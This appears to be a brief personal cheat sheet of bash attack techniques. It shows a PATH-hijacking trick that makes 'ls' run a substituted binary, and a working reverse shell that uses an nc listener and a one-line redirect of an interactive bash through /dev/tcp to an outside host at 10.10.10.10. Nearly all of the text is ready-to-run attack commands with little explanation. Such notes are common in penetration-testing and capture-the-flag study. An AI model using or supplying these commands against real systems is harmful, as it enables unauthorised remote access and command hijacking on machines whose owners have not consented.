# bash

## Path vulnerability

If something searches the Path for a a command and where able to replace the path we can trick the system to execute something else.  
Whenever we use `ls` it will now actually run `cat`.

```bash
export PATH="/tmp/tmp:${PATH}"
cp /bin/cat /tmp/tmp/cat
mv /tmp/tmp/cat /tmp/tmp/ls
```


## Reverse shell with /dev/tcp

local listener with nc on port 8000

```text
nc -lvp 8000
```

use /dev/tcp to connect to 10.10.10.10 on port 8000 and redirect bash to it.

```text
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/8000 0>&1
```